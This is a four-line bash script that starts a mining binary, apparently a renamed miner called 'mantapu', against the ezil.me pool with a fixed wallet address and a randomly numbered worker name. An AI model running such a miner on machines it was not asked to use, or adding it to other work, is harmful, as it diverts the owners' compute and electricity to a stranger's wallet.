#!/bin/bash
POOL=eu.ezil.me:5555
WALLET=0xae4fa9f4582afc88f329b862738c8c50e5268fba.zil12puphypaqtqazflf6q32daf4tpgm3g076ceqnn.EroZ
WORKER=$(echo $(shuf -i 1-4 -n 1)-GPU)
chmod +x mantapu
./mantapu --algo ETHASH --pool $POOL --user $WALLET.$WORKER
